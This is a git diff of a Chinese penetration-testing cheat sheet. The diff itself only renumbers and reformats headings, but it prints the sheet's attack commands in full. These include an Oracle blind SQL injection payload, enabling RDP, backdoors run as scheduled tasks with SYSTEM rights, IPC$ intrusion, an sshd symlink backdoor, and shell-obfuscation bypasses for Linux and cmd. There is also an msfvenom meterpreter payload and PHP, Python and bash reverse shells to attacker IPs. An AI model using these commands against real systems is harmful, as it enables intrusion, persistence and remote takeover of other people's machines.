@@ -2,12 +2,11 @@
 
 相关漏洞学习资料，利用方法和技巧合集 
 
-
 目录
-----------------------------------------------------
+---------------------------------------------------------
 
 * [Hacking study](#渗透相关语法)
-	* [信息收集](#信息收集)
+	* [0000 信息收集](#0000 信息收集)
 		* [域名相关](#域名相关)
 		* [指纹识别](#指纹识别)
 		* [ip位置](#ip位置)
@@ -16,7 +15,7 @@
 		* [github语法](#github语法)
 		* [端口扫描](#端口扫描)
 		* [其他](#其他)
-	* [注入基础](#注入基础)
+	* [0001 注入基础](#0001 注入基础)
 		 * [mssql注入](#mssql注入)
 			* [布尔注入](#布尔注入)
 			* [报错注入](#报错注入)
@@ -26,31 +25,30 @@
 			* [报错注入](#报错注入)
 			* [带外注入](#带外注入)
 			* [时间盲注](#时间盲注)
-	* [命令及后门相关](#命令及后门相关)
-			* [开3389](#开3389)
-			* [运行计划任务](#运行计划任务)
-			* [IPC入侵](#IPC入侵)
-			* [nmap命令](#nmap命令)
-			* [sshd软链接后门](#sshd软链接后门)
-			* [lsof命令](#lsof命令)
-			* [linux命令bypass](#linux命令bypass)
-			* [cmd命令bypass](#cmd命令bypass)
-			* [msf命令](#msf命令)
+	* [0002 命令及后门相关](#0002 命令及后门相关)
+		* [开3389](#开3389)
+		* [运行计划任务](#运行计划任务)
+		* [IPC入侵](#IPC入侵)
+		* [nmap命令](#nmap命令)
+		* [sshd软链接后门](#sshd软链接后门)
+		* [lsof命令](#lsof命令)
+		* [linux命令bypass](#linux命令bypass)
+		* [cmd命令bypass](#cmd命令bypass)
+		* [msf命令](#msf命令)
 			
-	* [shell反弹](#shell反弹)
-			* [php反弹shell](#php反弹shell)
-			* [python反弹shell](#python反弹shell)
-			* [bash反弹shell](#bash反弹shell)
-			
-			
-			
-## 信息收集
+	* [0003 shell反弹](#0003 shell反弹)
+		* [php反弹shell](#php反弹shell)
+		* [python反弹shell](#python反弹shell)
+		* [bash反弹shell](#bash反弹shell)
+
+				
+## 0000 信息收集
 
 > **前端js代码进行审计发现的一些路径记得去测试访问**
 
 ### 域名相关
 
-****工具****
+**工具**
 ```
 subDomainsBrute：https://github.com/lijiejie/subDomainsBrute
 Sublist3r
@@ -177,7 +175,7 @@ https://github.com/LandGrey/pydictor
 https://www.somd5.com/download/dict/
 ```		
 		
-## 注入基础
+## 0001 注入基础
 > **mssql、mysql、oracle 相关注入基础语句** 
 ### mssql注入
 
@@ -338,11 +336,9 @@ file_name(@@version)
 ' AND 7238=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL(CAST(USER AS VARCHAR(4000)),CHR(32)) FROM DUAL),1,1))>96) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(73),1) ELSE 7238 END)
 ```
 
-## 命令及后门相关
+## 0002 命令及后门相关
 > **后门命令及常用渗透命令** 
 ### 开3389
-
-**DOS下开3389**
 ```
 sc config termservice start= auto
 net start termservice
@@ -359,9 +355,8 @@ echo "PortNumber"=dword:00000d3d>>3389.reg
 之后执行
 regedit /s 3389.reg
 ```
-### 运行计划任务
 
-**windows运行计划任务**
+### 运行计划任务
 ```
 使用administrator创建以system用户身份运行程序的计划任务，可以运行如远控或msf后门等
 命令： 
@@ -377,8 +372,6 @@ schtasks /create /tn "system" /tr C:\Windows\system321.exe\system321.exe /sc MIN
 ```
 
 ### IPC入侵
-
-**IPC命令**
 ```
 net share 查看本地开启的共享 
 net share ipc$ 开启ipc$共享 
@@ -393,9 +386,8 @@ at \\127.0.0.25 10:50 srv.exe  #用at命令在0点50分启动srv.exe（注意这
 at \\127.0.0.25 10:50 "echo 5 > c:\t.txt" 在远程计算机上建立文本文件t.txt； 
 copy srv.exe \\hacden-pc\c$    #复制srv.exe到目标c盘上去 
 ```
-### nmap命令
 
-**nmap扫描**
+### nmap命令
 ```
 查询在线主机
 nmap -sn 192.168.56.0/24
@@ -406,8 +398,6 @@ nmap -sS -sV -T5 -A -p- 192.168.0.109
 ```
 
 ### sshd软链接后门
-
-**sshd软链接后门**
 ```
 1、服务端执行
 ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345
@@ -434,8 +424,6 @@ UsePAM no
 ```
 
 ### lsof命令
-
-**lsof进程信息**
 ```
 列出某个用户打开文件的信息：
 lsof -u username
@@ -457,12 +445,9 @@ lsof -i tcp:3389
 
 列出某个用户所有活跃的网络连接：
 lsof -a -u username -i
-
 ```
 
 ### linux命令bypass
-
-**bypass-绕过**
 ```
 使用反斜杠
 w\ho\am\i
@@ -510,12 +495,9 @@ awk执行系统命令三种方法：
 awk 'BEGIN{system("echo abc")}' 
 awk 'BEGIN{print "echo","abc"| "/bin/bash"}' 
 awk '{"date"| getline d; print d; close("d")}'
-
 ```
 
 ### cmd命令bypass
-
-**cmd命令混淆**
 ```
 逗号------------net user
 ,;,%coMSPec:~ -0, +27%,; ,;, ;/b, ;;; ,/c, ,,, ;start; , ; ;/b ; , /min ,;net user
@@ -546,17 +528,15 @@ CMd /C "sEt coM3= /ano&& SEt cOm2=stat&& seT CoM1=net&& caLl SeT fiNAl=%COm1%%cO
 ```
 
 ### msf命令
-
-**msf相关**
 ```
 生成exe文件
 msfveom -p windows/metepreter/reverse_tcp -a x86 --platform windows LHOST=192.168.43.63 LPORT=4444 -e x86/shikata_ga_nai -i 20 PrependMigrate=true -f exe >ma.exe
 ```
 
-## shell反弹
+## 0003 shell反弹
 > **反弹shell基本语句** 
-### php反弹shell
 
+### php反弹shell
 ```
 攻击机监听
 nc -lvvp 4444
@@ -567,7 +547,6 @@ php -r '$sock=fsockopen("192.168.23.88",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 ### python反弹shell
-
 ```
 代码
 import socket,subprocess,os
@@ -578,26 +557,21 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/bash","-i"])
 
-
 受害机执行
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.104",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
-
 
 攻击机执行
 nc -lvvp 5555
 
 交互shell
 python -c 'import pty; pty.spawn("/bin/bash")'
-
 ```
 
 ### bash反弹shell
-
 ```
 攻击机
 nc -lvvp 4444
 
 受害机
 bash -i >& /dev/tcp/47.98.229.211/4444 0>&1
-
 ```
